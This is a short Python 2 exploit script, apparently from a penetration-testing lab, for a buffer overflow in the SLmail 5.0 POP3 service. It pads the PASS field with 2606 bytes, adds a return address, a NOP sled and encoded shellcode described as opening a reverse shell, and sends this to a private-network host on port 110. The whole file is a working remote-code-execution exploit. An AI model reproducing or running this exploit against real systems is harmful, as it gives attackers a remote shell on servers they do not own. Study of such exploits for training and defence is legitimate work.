#! /usr/bin/python 

# This code is the last steop of BOF attack to SLmail 5.0
# It sends shellcode to the targart to get a reverse shell. 

import socket 


shellcode =("\xba\x51\x89\xbf\x38\xda\xd8\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x53\x0e\x03\x02\x87\x5d\xcd\x58\x7f\x23"
"\x2e\xa0\x80\x44\xa6\x45\xb1\x44\xdc\x0e\xe2\x74\x96\x42\x0f"
"\xfe\xfa\x76\x84\x72\xd3\x79\x2d\x38\x05\xb4\xae\x11\x75\xd7"
"\x2c\x68\xaa\x37\x0c\xa3\xbf\x36\x49\xde\x32\x6a\x02\x94\xe1"
"\x9a\x27\xe0\x39\x11\x7b\xe4\x39\xc6\xcc\x07\x6b\x59\x46\x5e"
"\xab\x58\x8b\xea\xe2\x42\xc8\xd7\xbd\xf9\x3a\xa3\x3f\x2b\x73"
"\x4c\x93\x12\xbb\xbf\xed\x53\x7c\x20\x98\xad\x7e\xdd\x9b\x6a"
"\xfc\x39\x29\x68\xa6\xca\x89\x54\x56\x1e\x4f\x1f\x54\xeb\x1b"
"\x47\x79\xea\xc8\xfc\x85\x67\xef\xd2\x0f\x33\xd4\xf6\x54\xe7"
"\x75\xaf\x30\x46\x89\xaf\x9a\x37\x2f\xa4\x37\x23\x42\xe7\x5f"
"\x80\x6f\x17\xa0\x8e\xf8\x64\x92\x11\x53\xe2\x9e\xda\x7d\xf5"
"\xe1\xf0\x3a\x69\x1c\xfb\x3a\xa0\xdb\xaf\x6a\xda\xca\xcf\xe0"
"\x1a\xf2\x05\xa6\x4a\x5c\xf6\x07\x3a\x1c\xa6\xef\x50\x93\x99"
"\x10\x5b\x79\xb2\xbb\xa6\xea\x7d\x93\x90\x85\x15\xe6\xe0\x5d"
"\x34\x6f\x06\x37\xa8\x26\x91\xa0\x51\x63\x69\x50\x9d\xb9\x14"
"\x52\x15\x4e\xe9\x1d\xde\x3b\xf9\xca\x2e\x76\xa3\x5d\x30\xac"
"\xcb\x02\xa3\x2b\x0b\x4c\xd8\xe3\x5c\x19\x2e\xfa\x08\xb7\x09"
"\x54\x2e\x4a\xcf\x9f\xea\x91\x2c\x21\xf3\x54\x08\x05\xe3\xa0"
"\x91\x01\x57\x7d\xc4\xdf\x01\x3b\xbe\x91\xfb\x95\x6d\x78\x6b"
"\x63\x5e\xbb\xed\x6c\x8b\x4d\x11\xdc\x62\x08\x2e\xd1\xe2\x9c"
"\x57\x0f\x93\x63\x82\x8b\xa3\x29\x8e\xba\x2b\xf4\x5b\xff\x31"
"\x07\xb6\x3c\x4c\x84\x32\xbd\xab\x94\x37\xb8\xf0\x12\xa4\xb0"
"\x69\xf7\xca\x67\x89\xd2")

buffer = 'A'*2606+'\x8F\x35\x4A\x5F'+"\x90"*16+shellcode 


try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print "\nSending evil buffer..." 
    s.connect(("192.168.56.108",110)) 
    s.recv(1024) 
    s.send("USER test" + '\r\n') 
    s.recv(1024) 
    s.send('PASS ' + buffer + '\r\n') 
    print"\nDone!."
    print(buffer)
except: print "Could not connect to POP3!"

